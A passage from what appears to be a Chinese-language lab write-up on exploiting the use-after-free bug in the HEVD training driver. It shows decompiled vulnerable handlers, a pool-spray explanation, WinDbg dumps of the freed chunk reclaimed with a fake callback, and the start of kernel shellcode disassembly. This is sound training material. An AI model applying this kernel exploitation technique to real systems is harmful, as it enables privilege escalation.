</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="o">*</span><span class="n">p1</span><span class="p">,</span> <span class="o">*</span><span class="n">p2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">p1</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;p1: </span><span class="se">\t</span><span class="s"> address:%X </span><span class="se">\t</span><span class="s"> value=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">p1</span><span class="p">,</span> <span class="o">*</span><span class="n">p1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">p2</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;p2: </span><span class="se">\t</span><span class="s"> address:%X </span><span class="se">\t</span><span class="s"> value=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">p2</span><span class="p">,</span> <span class="o">*</span><span class="n">p2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;p1: </span><span class="se">\t</span><span class="s"> address:%X </span><span class="se">\t</span><span class="s"> value=%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">p1</span><span class="p">,</span> <span class="o">*</span><span class="n">p1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>结果：</p>
<div class="highlight" id="id-76"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nl">p1</span><span class="p">:</span>      <span class="nl">address</span><span class="p">:</span><span class="n">C25E40</span>          <span class="n">value</span><span class="o">=</span><span class="mi">100</span>
</span></span><span class="line"><span class="cl"><span class="nl">p2</span><span class="p">:</span>      <span class="nl">address</span><span class="p">:</span><span class="n">C25E40</span>          <span class="n">value</span><span class="o">=</span><span class="mi">50</span>
</span></span><span class="line"><span class="cl"><span class="nl">p1</span><span class="p">:</span>      <span class="nl">address</span><span class="p">:</span><span class="n">C25E40</span>          <span class="n">value</span><span class="o">=</span><span class="mi">50</span></span></span></code></pre></div><p>可以看到<code>p1</code>句柄指向的堆块即使被释放了但是句柄没有设置为NULL，进而被重新读取到这块被释放的内存</p>
<h3 id="漏洞分析-1" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" class="heading-mark"></a>漏洞分析</h3><p><code>0x222013</code>到<code>0x22201B</code>分别是申请，使用和释放：</p>
<div class="highlight" id="id-77"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x222013u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="n">_DbgPrintEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v7</span> <span class="o">=</span> <span class="nf">AllocateUaFObjectNonPagedPoolIoctlHandler</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;****** HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x222017u</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="n">_DbgPrintEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v7</span> <span class="o">=</span> <span class="nf">UseUaFObjectNonPagedPoolIoctlHandler</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;****** HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x22201Bu</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="n">_DbgPrintEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v7</span> <span class="o">=</span> <span class="nf">FreeUaFObjectNonPagedPoolIoctlHandler</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;****** HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mh">0x22201Fu</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">v6</span> <span class="o">=</span> <span class="n">_DbgPrintEx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v7</span> <span class="o">=</span> <span class="nf">AllocateFakeObjectNonPagedPoolIoctlHandler</span><span class="p">(</span><span class="n">Irp</span><span class="p">,</span> <span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">v9</span> <span class="o">=</span> <span class="s">&#34;****** HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL ******</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_4</span><span class="p">;</span></span></span></code></pre></div><p>漏洞就再释放的那里，释放了但是没有置NULL：</p>
<div class="highlight" id="id-78"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">FreeUaFObjectNonPagedPool</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1073741823</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Freeing UaF Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;&#39;kcaH&#39;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ExFreePoolWithTag</span><span class="p">(</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">,</span> <span class="mh">0x6B636148u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>从而导致在<code>UseUaFObjectNonPagedPool</code>函数执行的时候还是可以调用全局指针<code>g_UseAfterFreeObjectNonPagedPool</code>：</p>
<div class="highlight" id="id-79"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__stdcall</span> <span class="nf">UseUaFObjectNonPagedPool</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// esi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="mh">0xC0000001</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Using UaF Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="o">*</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_DbgPrintEx</span><span class="p">(</span><span class="mh">0x4Du</span><span class="p">,</span> <span class="mi">3u</span><span class="p">,</span> <span class="s">&#34;[+] Calling Callback</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">(</span><span class="o">*</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">v0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><ul>
<li><code>AllocateUaFObjectNonPagedPool</code>函数给<code>g_UseAfterFreeObjectNonPagedPool</code>全局变量申请0x58大小的池空间（还有8字节的池头部，所以大小是0x60）；</li>
<li><code>UseUaFObjectNonPagedPool</code>函数执行全局变量指向的函数；</li>
<li><code>FreeUaFObjectNonPagedPool</code>函数释放全局指针；</li>
<li><code>AllocateFakeObjectNonPagedPool</code>函数也申请0x58的池空间，并将构造的数据写入该池空间。</li>
</ul>
<h3 id="漏洞利用" class="heading-element">
  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark"></a>漏洞利用</h3><p>这里用到了堆喷，**堆喷的原理可以这样简单理解：**假设有一个大小为n的内核pool chunk A，然后释放该chunk。当我们再次申请同样大小的chunk时，就有可能又会申请到A，只是概率较低，但是如果我们大量申请同样大小的chunk，就有很大的概率又申请到A空间。</p>
<p>exp在下面，断点：</p>
<div class="highlight" id="id-80"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">AllocateUaFObjectNonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">UseUaFObjectNonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">FreeUaFObjectNonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">bp</span> <span class="n">HEVD</span><span class="o">!</span><span class="n">AllocateFakeObjectNonPagedPool</span></span></span></code></pre></div><p>断在<code>AllocateUaFObjectNonPagedPool</code>，运行之后：</p>
<div class="highlight" id="id-81"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd014</span>  <span class="mf">875f85e0</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd024</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd034</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd044</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd054</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd064</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd074</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">a9ddd084</span>  <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="n">kd</span><span class="o">&gt;</span> <span class="n">dd</span> <span class="mf">875f85e0</span> 
</span></span><span class="line"><span class="cl"><span class="nl">ReadVirtual</span><span class="p">:</span> <span class="mf">875f85e0</span> <span class="n">not</span> <span class="n">properly</span> <span class="n">sign</span> <span class="n">extended</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f85e0</span>  <span class="n">a9de0418</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f85f</span><span class="mi">0</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f</span><span class="mi">8600</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f</span><span class="mi">8610</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f</span><span class="mi">8620</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f</span><span class="mi">8630</span>  <span class="mi">41414141</span> <span class="mo">00414141</span> <span class="mo">040</span><span class="n">b000c</span> <span class="mi">6</span><span class="n">d4d6956</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f</span><span class="mi">8640</span>  <span class="mi">941773</span><span class="n">a8</span> <span class="mi">9</span><span class="n">dcce910</span> <span class="n">a8e8be70</span> <span class="mo">00000000</span>
</span></span><span class="line"><span class="cl"><span class="mf">875f</span><span class="mi">8650</span>  <span class="mo">00000000</span> <span class="mf">85f9f</span><span class="mi">600</span> <span class="mi">96</span><span class="n">dff730</span> <span class="mo">00000000</span></span></span></code></pre></div><p>这时它的原有函数：</p>
<div class="highlight" id="id-82"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">u</span> <span class="no">a9de0418</span>
</span></span><span class="line"><span class="cl"><span class="nl">ReadVirtual:</span> <span class="nf">a9de0418</span> <span class="no">not</span> <span class="no">properly</span> <span class="no">sign</span> <span class="no">extended</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de0418</span> <span class="mi">680</span><span class="no">a1ddea9</span>      <span class="no">push</span>    <span class="no">offset</span> <span class="no">HEVD</span><span class="p">!</span> <span class="err">??</span> <span class="p">::</span><span class="no">NNGAKEGL</span><span class="p">::</span><span class="err">`</span><span class="no">string</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">a9de1d0a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de041d</span> <span class="mi">6</span><span class="no">a03</span>            <span class="no">push</span>    <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de041f</span> <span class="mi">6</span><span class="no">a4d</span>            <span class="no">push</span>    <span class="mi">4</span><span class="no">Dh</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de0421</span> <span class="no">ff1504c0d9a9</span>    <span class="no">call</span>    <span class="no">dword</span> <span class="no">ptr</span> <span class="p">[</span><span class="no">HEVD</span><span class="p">!</span><span class="no">_imp__DbgPrintEx</span> <span class="p">(</span><span class="no">a9d9c004</span><span class="p">)]</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de0427</span> <span class="mi">83</span><span class="no">c40c</span>          <span class="no">add</span>     <span class="no">esp</span><span class="p">,</span><span class="mi">0</span><span class="no">Ch</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de042a</span> <span class="no">c3</span>              <span class="no">ret</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de042b</span> <span class="no">cc</span>              <span class="no">int</span>     <span class="mi">3</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9de042c</span> <span class="mi">6</span><span class="no">a10</span>            <span class="no">push</span>    <span class="mi">10</span><span class="no">h</span></span></span></code></pre></div><p>这时它的池块：</p>
<div class="highlight" id="id-83"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="p">!</span><span class="no">pool</span> <span class="mi">875</span><span class="no">f85e0</span> 
</span></span><span class="line"><span class="cl"><span class="no">Pool</span> <span class="no">page</span> <span class="mi">875</span><span class="no">f85e0</span> <span class="no">region</span> <span class="no">is</span> <span class="no">Unknown</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span>
</span></span><span class="line"><span class="cl"><span class="err">*875</span><span class="nf">f85d8</span> <span class="no">size</span><span class="p">:</span>   <span class="mi">60</span> <span class="no">previous</span> <span class="no">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="no">Allocated</span><span class="p">)</span> <span class="p">*</span><span class="no">Hack</span>
</span></span><span class="line"><span class="cl">		<span class="nf">Owning</span> <span class="no">component</span> <span class="p">:</span> <span class="no">Unknown</span> <span class="p">(</span><span class="no">update</span> <span class="no">pooltag.txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span></span></span></code></pre></div><p>继续运行free后：</p>
<div class="highlight" id="id-84"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="p">!</span><span class="no">pool</span> <span class="mi">875</span><span class="no">f85e0</span> 
</span></span><span class="line"><span class="cl"><span class="no">Pool</span> <span class="no">page</span> <span class="mi">875</span><span class="no">f85e0</span> <span class="no">region</span> <span class="no">is</span> <span class="no">Unknown</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span>
</span></span><span class="line"><span class="cl"><span class="err">*875</span><span class="nf">f85d8</span> <span class="no">size</span><span class="p">:</span>   <span class="mi">60</span> <span class="no">previous</span> <span class="no">size</span><span class="p">:</span>   <span class="mi">48</span>  <span class="p">(</span><span class="no">Free</span> <span class="p">)</span> <span class="p">*</span><span class="no">Hack</span>
</span></span><span class="line"><span class="cl">		<span class="nf">Owning</span> <span class="no">component</span> <span class="p">:</span> <span class="no">Unknown</span> <span class="p">(</span><span class="no">update</span> <span class="no">pooltag.txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span></span></span></code></pre></div><p>接下来继续运行<code>AllocateFakeObjectNonPagedPool</code>函数，堆喷之后：</p>
<div class="highlight" id="id-85"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="p">!</span><span class="no">pool</span> <span class="mi">875</span><span class="no">f85e0</span> 
</span></span><span class="line"><span class="cl"><span class="no">Pool</span> <span class="no">page</span> <span class="mi">875</span><span class="no">f85e0</span> <span class="no">region</span> <span class="no">is</span> <span class="no">Unknown</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span>
</span></span><span class="line"><span class="cl">		<span class="nf">Owning</span> <span class="no">component</span> <span class="p">:</span> <span class="no">Unknown</span> <span class="p">(</span><span class="no">update</span> <span class="no">pooltag.txt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="na">...</span></span></span></code></pre></div><p>这时可以看到，前4字节已经变成了shellcode的地址：</p>
<div class="highlight" id="id-86"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">dd</span> <span class="no">g_UseAfterFreeObjectNonPagedPool</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd014</span>  <span class="mi">875</span><span class="no">f85e0</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd024</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd034</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd044</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd054</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd064</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd074</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">a9ddd084</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">dd</span> <span class="mi">875</span><span class="no">f85e0</span> 
</span></span><span class="line"><span class="cl"><span class="mi">875</span><span class="no">f85e0</span>  <span class="mi">00</span><span class="no">b71040</span> <span class="mi">44434241</span> <span class="mi">44434241</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f85f0</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f8600</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f8610</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f8620</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f8630</span>  <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">040</span><span class="no">b000c</span> <span class="mi">6</span><span class="no">d4d6956</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f8640</span>  <span class="mi">941773</span><span class="no">a8</span> <span class="mi">9</span><span class="no">dcce910</span> <span class="no">a8e8be70</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="err">875</span><span class="nf">f8650</span>  <span class="mi">00000000</span> <span class="mi">85</span><span class="no">f9f600</span> <span class="mi">96</span><span class="no">dff730</span> <span class="mi">00000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">kd</span><span class="err">&gt;</span> <span class="no">u</span> <span class="mi">00</span><span class="no">b71040</span> 
</span></span><span class="line"><span class="cl"><span class="mi">00</span><span class="no">b71040</span> <span class="mi">53</span>              <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b71041</span> <span class="mi">56</span>              <span class="no">push</span>    <span class="no">esi</span>
</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b71042</span> <span class="mi">57</span>              <span class="no">push</span>    <span class="no">edi</span>
</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b71043</span> <span class="mi">90</span>              <span class="no">nop</span>
</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b71044</span> <span class="mi">60</span>              <span class="no">pushad</span>
</span></span><span class="line"><span class="cl"><span class="err">00</span><span class="nf">b71045</span> <span class="mi">64</span><span class="no">a124010000</span>    <span class="no">mov</span>     <span class="no">eax</span><span class="p">,</span><span class="no">dword</span> <span class="no">ptr</span> <span class="no">fs</span><span class="p">:[</span><span class="mi">00000124</span><span class="no">h</span><span class="p">]</span>
